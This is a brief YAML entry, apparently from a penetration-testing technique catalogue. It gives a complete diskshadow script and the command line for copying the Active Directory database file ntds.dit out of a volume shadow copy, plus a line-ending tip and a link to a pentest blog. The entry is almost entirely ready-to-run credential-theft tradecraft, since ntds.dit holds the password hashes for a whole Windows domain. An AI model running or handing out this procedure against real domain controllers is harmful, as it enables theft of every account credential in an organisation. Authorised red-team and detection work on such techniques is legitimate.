---
functions:
  ttp-tip:

    - description: Grab NTDS.dit with diskshadow
      code: |
        shadow.txt Script:
        set context persistent nowriters
        add volume c: alias someAlias
        create
        expose %someAlias% z:
        exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
        delete shadows volume %someAlias%
        reset
        
        Command: diskshadow.exe /s c:\diskshadow.txt

        REMINDER: If created on linux you will need to run unix2dos to convert the line returns

resources: |
  https://pentestlab.blog/tag/diskshadow/

---